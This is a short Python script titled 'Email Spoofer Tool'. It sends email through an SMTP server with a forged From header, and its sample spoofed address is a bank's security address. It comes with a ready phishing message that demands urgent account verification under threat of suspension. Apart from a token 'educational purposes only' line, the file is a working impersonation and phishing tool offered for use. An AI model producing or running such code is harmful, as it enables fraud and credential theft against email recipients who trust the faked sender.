import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def send_spoofed_email(real_sender, password, recipient, spoofed_sender, subject, body):
    # --- SMTP Server Configuration ---
    # Use a real SMTP server for this to work.
    # For testing, you can use services like Mailtrap or a local SMTP server.
    # Example for Gmail (may require 'less secure app access'):
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    
    # Create the email
    msg = MIMEMultipart()
    msg['From'] = spoofed_sender # The address we are faking
    msg['To'] = recipient
    msg['Subject'] = subject
    
    msg.attach(MIMEText(body, 'plain'))
    
    try:
        print(f"Connecting to {smtp_server}...")
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        
        print("Logging in...")
        server.login(real_sender, password)
        
        print(f"Sending email to {recipient} from spoofed address {spoofed_sender}...")
        server.sendmail(real_sender, recipient, msg.as_string())
        
        print("Email sent successfully!")
        
    except Exception as e:
        print(f"Error: {e}")
    finally:
        if 'server' in locals():
            server.quit()

if __name__ == '__main__':
    print("--- Email Spoofer Tool ---")
    print("WARNING: Use for educational purposes only.")

    # --- Your REAL email credentials ---
    YOUR_EMAIL = "your_mail@gmail.com"
    YOUR_APP_PASSWORD = "your pass here " # Use an App Password for Gmail
    
    # --- Email details ---
    recipient_email = input("Enter recipient's email: ")
    spoofed_email = input("Enter the email address to spoof (e.g., security@yourbank.com): ")
    email_subject = "Urgent Security Alert: Please Verify Your Account"
    email_body = """
    Dear Customer,

    We have detected suspicious activity on your account. To protect your information, please verify your identity immediately by clicking the link below.

    Failure to do so within 24 hours will result in permanent account suspension.

    Thank you,
    Security Team
    """
    
    send_spoofed_email(YOUR_EMAIL, YOUR_APP_PASSWORD, recipient_email, spoofed_email, email_subject, email_body)